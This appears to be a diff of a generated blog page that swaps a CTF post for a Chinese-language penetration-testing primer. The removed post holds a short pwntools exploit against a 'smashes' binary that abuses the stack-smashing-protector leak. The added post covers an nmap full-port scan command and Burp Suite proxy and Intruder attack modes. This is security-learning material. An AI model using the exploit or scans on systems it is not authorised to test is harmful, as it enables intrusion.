@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="Stack Smashing Protector(SSP)  leak">
+<meta name="description" content="工具篇nmap扫描端口 nmap用于扫描目标网站目前使用端口 命令: nmap -Pn -p 1-65535 targetUrl    常见漏洞 当目标网站仅适用开放端口中的几个，而又有其它限制端口开放。建议关闭闲置端口，否则可能会造成信息泄露。   burpsuit前提配置firefox 安装firefox 点击附加组件并搜索FoxyProxy代理插件且安装 点击插件FoxyProxy下的Opt">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Stack Smashing Protector--SSP">
-<meta property="og:url" content="http://yoursite.com/2018/12/05/smashes-ssp/index.html">
+<meta property="og:title" content="渗透测试">
+<meta property="og:url" content="http://yoursite.com/2019/08/07/burpsuit/index.html">
 <meta property="og:site_name" content="Archer">
-<meta property="og:description" content="Stack Smashing Protector(SSP)  leak">
+<meta property="og:description" content="工具篇nmap扫描端口 nmap用于扫描目标网站目前使用端口 命令: nmap -Pn -p 1-65535 targetUrl    常见漏洞 当目标网站仅适用开放端口中的几个，而又有其它限制端口开放。建议关闭闲置端口，否则可能会造成信息泄露。   burpsuit前提配置firefox 安装firefox 点击附加组件并搜索FoxyProxy代理插件且安装 点击插件FoxyProxy下的Opt">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-15T02:58:30.954Z">
+<meta property="og:updated_time" content="2019-08-07T09:28:59.795Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Stack Smashing Protector--SSP">
-<meta name="twitter:description" content="Stack Smashing Protector(SSP)  leak">
+<meta name="twitter:title" content="渗透测试">
+<meta name="twitter:description" content="工具篇nmap扫描端口 nmap用于扫描目标网站目前使用端口 命令: nmap -Pn -p 1-65535 targetUrl    常见漏洞 当目标网站仅适用开放端口中的几个，而又有其它限制端口开放。建议关闭闲置端口，否则可能会造成信息泄露。   burpsuit前提配置firefox 安装firefox 点击附加组件并搜索FoxyProxy代理插件且安装 点击插件FoxyProxy下的Opt">
 
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/05/smashes-ssp/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/08/07/burpsuit/"/>
 
 
 
 
 
-  <title>Stack Smashing Protector--SSP | Archer</title>
+  <title>渗透测试 | Archer</title>
   
 
 
@@ -232,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/05/smashes-ssp/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/07/burpsuit/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Fake Student">
@@ -249,7 +249,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Stack Smashing Protector--SSP</h1>
+          <h1 class="post-title" itemprop="name headline">渗透测试</h1>
         
 
         <div class="post-meta">
@@ -261,8 +261,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-05T15:52:13+08:00">
-                2018-12-05
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-07T11:03:06+08:00">
+                2019-08-07
               </time>
             
 
@@ -299,8 +299,58 @@
       
 
       
-        <p>Stack Smashing Protector(SSP)  leak<br><a id="more"></a><br>觉得自己不能再补充了<a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">大佬博客</a></p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./smashes"</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x400d21</span>)*<span class="number">150</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <h1 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><ul>
+<li>nmap用于扫描目标网站目前使用端口<ul>
+<li>命令: nmap -Pn -p 1-65535 targetUrl</li>
+</ul>
+</li>
+</ul>
+<h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><ul>
+<li>当目标网站仅适用开放端口中的几个，而又有其它限制端口开放。建议关闭闲置端口，否则可能会造成信息泄露。</li>
+</ul>
+<hr>
+<h2 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h2><h3 id="前提配置"><a href="#前提配置" class="headerlink" title="前提配置"></a>前提配置</h3><h4 id="firefox"><a href="#firefox" class="headerlink" title="firefox"></a>firefox</h4><ul>
+<li>安装firefox</li>
+<li>点击附加组件并搜索FoxyProxy代理插件且安装<ul>
+<li>点击插件FoxyProxy下的Options添加本地IP(127.0.0.1:8080)<h4 id="burpsuit-1"><a href="#burpsuit-1" class="headerlink" title="burpsuit"></a>burpsuit</h4></li>
+</ul>
+</li>
+<li>选择界面Proxy-&gt;options中添加本地IP(127.0.0.1:8080)并选中。<h3 id="界面布局"><a href="#界面布局" class="headerlink" title="界面布局"></a>界面布局</h3></li>
+<li>主要使用Proxy、Intruder、Repeater三个功能<h4 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h4></li>
+<li>Forward：将请求包发送<ul>
+<li>可以篡改该数据包</li>
+</ul>
+</li>
+<li>Drop：丢掉数据包</li>
+<li>Intercept is on(off)：截断开启(关闭)</li>
+<li>Action：对请求包进行操作<h4 id="Intruder–入侵者"><a href="#Intruder–入侵者" class="headerlink" title="Intruder–入侵者"></a>Intruder–入侵者</h4></li>
+<li>Target–侵入目标<ul>
+<li>可以设置要入侵的Url与端口</li>
+</ul>
+</li>
+<li>Position<ul>
+<li>Attack type:Sniper、Battering ram、PitchFork、Cluster bomb<ul>
+<li>Sniper–狙击、单点攻击<ul>
+<li>选择这个模式将会使用单一的payload进行入侵，并且每次只给一个位置添加payloads。</li>
+</ul>
+</li>
+<li>Battering ram–攻城锤，并排攻击<ul>
+<li>使用单一payload，将同一payload添加到每个position中。</li>
+</ul>
+</li>
+<li>PitchFork–叉状攻击<ul>
+<li>使用多个payload组。例：positionA1放payloadsA1，positionB1放payloadsB1，攻击次数与payloads数量相同</li>
+</ul>
+</li>
+<li>Cluster bomb–集束炸弹<ul>
+<li>使用多个payload组。例：positionA1放payloadsA1，positionB1放payloadsB1，攻击次数为payloadsA*payloadsB数量之积。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
 
       
     </div>
@@ -325,8 +375,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/03/Docker Ues/" rel="next" title="局域网访问 Docker 容器">
-                <i class="fa fa-chevron-left"></i> 局域网访问 Docker 容器
+              <a href="/2019/04/26/ret2dl-resolve/" rel="next" title="ret2dl-resolve">
+                <i class="fa fa-chevron-left"></i> ret2dl-resolve
               </a>
             
           </div>
@@ -335,8 +385,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/01/13/Canary-TSL/" rel="prev" title="Canary-TLS">
-                Canary-TLS <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/08/WEB-要点/" rel="prev" title="WEB 要点">
+                WEB 要点 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -460,7 +510,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">1.</span> <span class="nav-text">EXP</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#工具篇"><span class="nav-number">1.</span> <span class="nav-text">工具篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-number">1.1.</span> <span class="nav-text">nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描端口"><span class="nav-number">1.1.1.</span> <span class="nav-text">扫描端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见漏洞"><span class="nav-number">1.1.2.</span> <span class="nav-text">常见漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#burpsuit"><span class="nav-number">1.2.</span> <span class="nav-text">burpsuit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前提配置"><span class="nav-number">1.2.1.</span> <span class="nav-text">前提配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#firefox"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">firefox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#burpsuit-1"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">burpsuit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#界面布局"><span class="nav-number">1.2.2.</span> <span class="nav-text">界面布局</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Proxy"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">Proxy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Intruder–入侵者"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">Intruder–入侵者</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
